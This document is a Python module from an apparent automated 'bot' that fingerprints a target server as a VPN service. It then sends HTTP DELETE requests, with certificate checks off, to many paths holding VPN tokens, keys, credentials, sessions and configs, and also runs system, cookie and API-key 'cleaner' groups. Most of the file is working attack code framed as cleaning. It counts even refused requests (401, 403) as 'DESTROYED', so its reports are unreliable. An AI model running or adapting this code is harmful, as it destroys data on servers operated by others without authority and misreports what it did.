#!/usr/bin/env python3
"""apex_vpn.py - 3 VPN Suspicious Cleaners (Free/Private/Protocol)"""
import datetime
from apex_utils import p_vpn_sus, p_vpn, p_crit, p_ok, p_okay, p_err
from apex_config import (
    VPN_SUSPICIOUS_SIGNATURES, VPN_KNOWN_DOMAINS, VPN_CLEANER_PATHS,
    CLEANER_SYSTEM_PATHS, COOLDOWN_CLEANER_PATHS,
    CLEANER_ALL_COOKIES_PATHS, APIKEY_CLEANER_PATHS,
)


class VPNSuspiciousCleaner:
    FREE_VPN_DOMAINS = {
        'hola.org', 'holavpn.com', 'psiphon.ca', 'psiphon3.com',
        'windscribe.com', 'windscribe.net', 'protonvpn.com', 'protonvpn.net',
        'freevpn.org', 'freevpn.com', 'betternet.co', 'betternet.com',
        'tunnelbear.com', 'hotspotshield.com',
    }
    PRIVATE_VPN_DOMAINS = {
        'nordvpn.com', 'nordvpn.net', 'nordcdn.com',
        'expressvpn.com', 'expressvpn.net',
        'surfshark.com', 'surfshark.net',
        'cyberghostvpn.com', 'cyberghost.net',
        'privatevpn.com', 'privatevpn.net',
        'ipvanish.com', 'ipvanish.net',
        'purevpn.com', 'purevpn.net',
        'mullvad.net', 'mullvad.com',
        'astrill.com', 'astrill.net',
        'perfect-privacy.com', 'ivacy.com', 'ivacy.net',
        'hide.me', 'vpn.ac', 'azirevpn.com', 'ovpn.com',
    }
    PROTOCOL_VPN_DOMAINS = {
        'openvpn.net', 'openvpn.org', 'wireguard.com',
        'shadowsocks.org', 'v2fly.org', 'v2ray.com',
        'softether.org', 'vpngate.net', 'torproject.org',
    }

    def __init__(self, bot):
        self.bot = bot

    def _analyze(self, body_raw, headers, status_code, result, weight=1):
        body = body_raw.lower()
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        headers_combined = "\n".join(f"{k}: {v}" for k, v in headers_lower.items())
        score = 0
        for domain, name in VPN_KNOWN_DOMAINS.items():
            if domain.lower() in self.bot.hostname.lower() or domain.lower() in body:
                if not any(m.get('domain') == domain for m in result['matched_types']):
                    result['matched_types'].append({
                        'type': 'VPN-Domain', 'domain': domain, 'name': name,
                    })
                    score += 3 * weight
                    p_vpn_sus(f"VPN Domain detected: {name} ({domain})")
        for sus_name, sigs in VPN_SUSPICIOUS_SIGNATURES.items():
            for sig in sigs.get('headers', []):
                if sig in headers_combined:
                    if not any(m['signature'] == sig for m in result['matched_headers']):
                        result['matched_headers'].append({
                            'signature': sig, 'type': sus_name, 'source': 'header',
                        })
                        score += 4 * weight
                        p_vpn_sus(f"VPN Suspicious Header: {sus_name} → {sig}")
            for sig in sigs.get('body', []):
                if sig.lower() in body:
                    if not any(m['signature'] == sig for m in result['matched_bodies']):
                        result['matched_bodies'].append({
                            'signature': sig, 'type': sus_name, 'source': 'body',
                        })
                        score += 3 * weight
                        p_vpn_sus(f"VPN Suspicious Body: {sus_name} → {sig}")
            if status_code in sigs.get('status_codes', []):
                if status_code not in result['matched_status_codes']:
                    result['matched_status_codes'].append(status_code)
                    score += 2 * weight
                    p_vpn_sus(f"VPN Suspicious Status: {status_code} ({sus_name})")
        return score

    # ---------- detect for any VPN ----------
    def detect_vpn_suspicious_server(self):
        result = self.bot.vpn_suspicious_results
        print("\n=== VPN SUSPICIOUS SERVER DETECTION ===")
        url = self.bot.target if self.bot.mode == 'link' else self.bot.base_url
        try:
            r = self.bot._request('GET', url, allow_redirects=True)
            score = self._analyze(r.text, r.headers, r.status_code, result, weight=1)
            deep_score = 0
            for path in VPN_CLEANER_PATHS.get('vpn', []):
                try:
                    r2 = self.bot._request('GET', self.bot.base_url + path,
                                           timeout=3, allow_redirects=False)
                    if r2.status_code in (200, 201, 202, 204, 401, 403, 429,
                                          500, 502, 503, 504):
                        deep_score += 2
                        result['matched_types'].append({
                            'type': 'Deep-Path', 'path': path, 'status': r2.status_code,
                        })
                        p_vpn_sus(f"Deep VPN path: {path} ({r2.status_code})")
                except Exception:
                    pass
            score += deep_score
            result['copy_score'] = score
            result['is_copy'] = score >= 3
            result['detected_at'] = datetime.datetime.now().isoformat()
            if result['is_copy']:
                p_crit(f"VPN SUSPICIOUS SERVER DETECTED! Score: {result['copy_score']}")
                self._instant_vpn_clean(result)
            else:
                p_ok(f"No VPN suspicious server (score={result['copy_score']})")
        except Exception as e:
            p_err(f"VPN suspicious detection failed: {e}")
        return result

    def _instant_vpn_clean(self, result):
        before = self.bot.cleaner_stats['total_cleaned']
        self.run_vpn_suspicious_cleaner()
        result['destroyed'] = True
        result['destroy_count'] = self.bot.cleaner_stats['total_cleaned'] - before
        self.bot.cleaner_stats['vpn_suspicious_system_cleaned'] += 1

    def run_vpn_suspicious_cleaner(self):
        total = (self.bot.cleaner.clean_group('vpn', VPN_CLEANER_PATHS['vpn']) +
                 self.bot.cleaner.clean_group('system', CLEANER_SYSTEM_PATHS) +
                 self.bot.cleaner.clean_group('cooldown', COOLDOWN_CLEANER_PATHS) +
                 self.bot.cleaner.clean_group('all_cookies', CLEANER_ALL_COOKIES_PATHS) +
                 self.bot.cleaner.clean_group('apikey', APIKEY_CLEANER_PATHS))
        total += self.clean_vpn_tokens()
        total += self._destroy_vpn_suspicious_paths()
        self.bot.cleaner_stats['total_cleaned'] += total
        self.bot.cleaner_stats['vpn_cleaned'] += total
        p_ok(f"VPN Suspicious cleaner: {total} items")
        return total

    # ---------- Free VPN ----------
    def universal_freevpn_clean(self):
        p_vpn("=== FREE VPN SUSPICIOUS CLEAN ===")
        result = self.bot.freevpn_suspicious_results
        try:
            r = self.bot._request('GET', self.bot.base_url, allow_redirects=True)
            score = self._analyze(r.text, r.headers, r.status_code, result)
            result['copy_score'] = score
            result['is_copy'] = score >= 3
            result['detected_at'] = datetime.datetime.now().isoformat()
            if result['is_copy']:
                p_crit(f"FREE VPN DETECTED! Score: {result['copy_score']}")
                before = self.bot.cleaner_stats['total_cleaned']
                self.clean_freevpn_group()
                result['destroyed'] = True
                result['destroy_count'] = self.bot.cleaner_stats['total_cleaned'] - before
                self.bot.cleaner_stats['freevpn_cleaned'] += 1
            else:
                p_ok(f"No free VPN (score={result['copy_score']})")
        except Exception as e:
            p_err(f"Free VPN failed: {e}")
        return result

    def clean_freevpn_group(self):
        paths = [p for p in VPN_CLEANER_PATHS['vpn']
                 if any(k in p for k in ['free', 'hola', 'psiphon', 'proton', 'windscribe'])]
        return self.bot.cleaner.clean_group('freevpn', paths)

    # ---------- Private VPN ----------
    def universal_privatevpn_clean(self):
        p_vpn("=== PRIVATE VPN SUSPICIOUS CLEAN ===")
        result = self.bot.privatevpn_suspicious_results
        try:
            r = self.bot._request('GET', self.bot.base_url, allow_redirects=True)
            score = self._analyze(r.text, r.headers, r.status_code, result)
            result['copy_score'] = score
            result['is_copy'] = score >= 3
            result['detected_at'] = datetime.datetime.now().isoformat()
            if result['is_copy']:
                p_crit(f"PRIVATE VPN DETECTED! Score: {result['copy_score']}")
                before = self.bot.cleaner_stats['total_cleaned']
                self.clean_privatevpn_group()
                result['destroyed'] = True
                result['destroy_count'] = self.bot.cleaner_stats['total_cleaned'] - before
                self.bot.cleaner_stats['privatevpn_cleaned'] += 1
            else:
                p_ok(f"No private VPN (score={result['copy_score']})")
        except Exception as e:
            p_err(f"Private VPN failed: {e}")
        return result

    def clean_privatevpn_group(self):
        paths = [p for p in VPN_CLEANER_PATHS['vpn']
                 if any(k in p for k in ['nord', 'express', 'surfshark',
                                         'cyberghost', 'private', 'ipvanish',
                                         'pure', 'mullvad'])]
        return self.bot.cleaner.clean_group('privatevpn', paths)

    # ---------- Protocol VPN ----------
    def universal_protocolvpn_clean(self):
        p_vpn("=== PROTOCOL VPN SUSPICIOUS CLEAN ===")
        result = self.bot.protocolvpn_suspicious_results
        try:
            r = self.bot._request('GET', self.bot.base_url, allow_redirects=True)
            score = self._analyze(r.text, r.headers, r.status_code, result)
            result['copy_score'] = score
            result['is_copy'] = score >= 3
            result['detected_at'] = datetime.datetime.now().isoformat()
            if result['is_copy']:
                p_crit(f"PROTOCOL VPN DETECTED! Score: {result['copy_score']}")
                before = self.bot.cleaner_stats['total_cleaned']
                self.clean_protocolvpn_group()
                result['destroyed'] = True
                result['destroy_count'] = self.bot.cleaner_stats['total_cleaned'] - before
                self.bot.cleaner_stats['protocolvpn_cleaned'] += 1
            else:
                p_ok(f"No protocol VPN (score={result['copy_score']})")
        except Exception as e:
            p_err(f"Protocol VPN failed: {e}")
        return result

    def clean_protocolvpn_group(self):
        paths = [p for p in VPN_CLEANER_PATHS['vpn']
                 if any(k in p for k in ['openvpn', 'wireguard',
                                         'shadowsocks', 'v2ray'])]
        return self.bot.cleaner.clean_group('protocolvpn', paths)

    # ---------- shared helpers ----------
    def clean_vpn_tokens(self):
        cleaned = 0
        vpn_token_paths = [
            '/vpn/tokens', '/vpn/keys', '/vpn/certs',
            '/openvpn/keys', '/openvpn/certs', '/openvpn/credentials',
            '/wireguard/keys', '/wireguard/private-keys',
            '/wireguard/peers', '/wireguard/config',
            '/shadowsocks/keys', '/shadowsocks/config',
            '/v2ray/keys', '/v2ray/config',
            '/vpn/session', '/vpn/sessions', '/vpn/credentials',
            '/vpn/auth', '/vpn/login', '/vpn/cert/revoked',
        ]
        for path in vpn_token_paths:
            try:
                url = self.bot.base_url + path
                r = self.bot._request('GET', url, timeout=3, allow_redirects=False)
                if r.status_code in (200, 201, 202, 204, 301, 302, 401, 403):
                    try:
                        self.bot.session.delete(url, timeout=3, verify=False)
                    except Exception:
                        pass
                    cleaned += 1
                    self.bot.cleaner_stats['tokens_cleaned'] += 1
                    self.bot.cleaner_stats['okay_signals'] += 1
                    p_okay(f"OKAY - VPN TOKEN DESTROYED: {path}")
            except Exception:
                pass
        return cleaned

    def _destroy_vpn_suspicious_paths(self):
        destroyed = 0
        for path in [
            '/vpn/suspicious', '/vpn/suspicious-activity',
            '/vpn/compromised', '/vpn/breach', '/vpn/attack',
            '/vpn/anomaly', '/vpn/alert',
            '/vpn/tunnel/anomaly', '/vpn/tunnel/compromised',
            '/vpn/exit-node/compromised', '/vpn/exit-node/breach',
            '/vpn/server-compromised', '/vpn/server/compromised',
            '/vpn/cert/revoked', '/vpn/key/revoked',
            '/vpn/session/revoked', '/vpn/account/suspended',
            '/vpn/account/banned', '/vpn/banned',
            '/openvpn/suspicious', '/openvpn/compromised',
            '/wireguard/suspicious', '/wireguard/compromised',
            '/shadowsocks/suspicious', '/shadowsocks/compromised',
            '/v2ray/suspicious', '/v2ray/compromised',
        ]:
            try:
                url = self.bot.base_url + path
                r = self.bot._request('GET', url, timeout=3, allow_redirects=False)
                if r.status_code in (200, 201, 202, 204, 301, 302, 401, 403):
                    try:
                        self.bot.session.delete(url, timeout=3, verify=False)
                    except Exception:
                        pass
                    destroyed += 1
                    self.bot.cleaner_stats['okay_signals'] += 1
                    p_okay(f"OKAY - VPN SUSPICIOUS PATH DESTROYED: {path}")
            except Exception:
                pass
        return destroyed

    def universal_vpn_suspicious_clean(self):
        p_vpn_sus("=== VPN SUSPICIOUS CLEAN (ALL 3) ===")
        result = self.detect_vpn_suspicious_server()
        self.universal_freevpn_clean()
        self.universal_privatevpn_clean()
        self.universal_protocolvpn_clean()
        return result
